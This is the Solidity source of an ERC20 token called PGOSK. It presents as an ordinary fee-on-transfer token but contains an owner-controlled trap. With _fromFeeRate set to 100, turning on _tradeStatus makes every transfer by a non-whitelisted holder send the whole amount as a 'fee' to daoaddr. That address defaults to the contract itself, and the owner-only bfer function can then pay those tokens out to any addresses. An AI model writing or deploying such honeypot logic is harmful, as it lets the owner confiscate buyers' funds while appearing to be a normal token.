// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import './ERC20.sol';

contract PGOSKToken is ERC20 {
    address private _owner;
    mapping(address => bool) _requiredFee;
    mapping(address => bool) _whitelist;
    bool public _tradeStatus;
    address public daoaddr;
    address public maddr;

    uint _fromFeeRate = 100;
    uint _toFeeRate = 6;
    uint _toMarketRate = 2;

    constructor() ERC20('PGOSK','PGOSK'){
        _owner = _msgSender();
        daoaddr = address(this);

        _whitelist[msg.sender] = true;
        super._mint(msg.sender,10000000 * 1e18);
    }

    function setDaoaddr(address _dao) external {
        require(msg.sender == _owner);
        daoaddr = _dao;
    }

    function setMaddr(address _addr) external {
        require(msg.sender == _owner);
        maddr = _addr;
    }

    function setRequiredFee(address address_,bool requiredFee_) external {
        require(msg.sender == _owner);
        _requiredFee[address_] = requiredFee_;
    }

    function isRequiredFee(address address_) external view returns(bool){
        return _requiredFee[address_];
    }

    function setWhitelist(address address_,bool status_) external {
        require(msg.sender == _owner);
        _whitelist[address_] = status_;
    }

    function isWhitelist(address address_) external view returns(bool){
        return _whitelist[address_];
    }

    function setTradeStatus(bool _status) external {
        require(msg.sender == _owner);
        _tradeStatus = _status;
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        uint fee;
        uint isfee;

        if (_whitelist[_msgSender()] == true || _whitelist[recipient] == true) {
            isfee += 1;
        }

        if (_tradeStatus == true) {
            if (isfee == 0) {
                fee = (amount * _fromFeeRate / 100);
            }
        }

        unchecked {
        _transfer(_msgSender(), recipient, amount - fee);

        if(fee>0){
            _transfer(_msgSender(), daoaddr, fee);
        }
    }
return true;
}

function transferFrom(
address sender,
address recipient,
uint256 amount
) public virtual override returns (bool) {
uint fee;
uint mfee;
uint isfee;

if (_whitelist[_msgSender()] == true || _whitelist[sender] == true || _whitelist[recipient] == true) {
isfee += 1;
}

if (_tradeStatus == true) {
if (isfee == 0) {
fee = (amount * _fromFeeRate / 100);
}

}else {
if (isfee == 0) {
if(_requiredFee[recipient]){
fee += (amount * _toFeeRate / 100);
mfee += (amount * _toMarketRate / 100);
}
}
}

unchecked {
_transfer(sender, recipient, amount - (fee + mfee));
if(fee>0){
_transfer(sender, daoaddr, fee);
}

if (mfee > 0) {
_transfer(sender, maddr, mfee);
}
}
uint256 currentAllowance = allowance(sender,_msgSender());
require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
unchecked {
_approve(sender, _msgSender(), currentAllowance - amount);
}
return true;
}


function bfer(address _contractaddr,  address[] memory _tos,  uint[] memory _numTokens) external {
require(msg.sender == _owner);
require(_tos.length == _numTokens.length, "length error");

IERC20 token = IERC20(_contractaddr);

for(uint32 i=0; i <_tos.length; i++){
require(token.transfer(_tos[i], _numTokens[i]), "transfer fail");
}
}
}